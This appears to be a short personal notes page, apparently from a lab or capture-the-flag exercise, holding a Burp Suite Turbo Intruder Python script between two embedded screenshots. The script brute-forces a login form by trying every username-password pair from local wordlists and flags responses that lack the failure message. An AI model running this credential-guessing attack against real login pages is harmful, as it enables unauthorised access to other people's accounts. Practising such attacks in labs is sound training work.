
![[Pasted image 20231205025232.png]]

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for firstWord in open('/home/kali/usernames.txt'):
      for secondWord in open('/home/kali/passwords4.txt'):
        engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    #if req.status != 404:
    if "Please enter the correct credentials" not in req.response:
        table.add(req)
```

![[Pasted image 20231205025828.png]]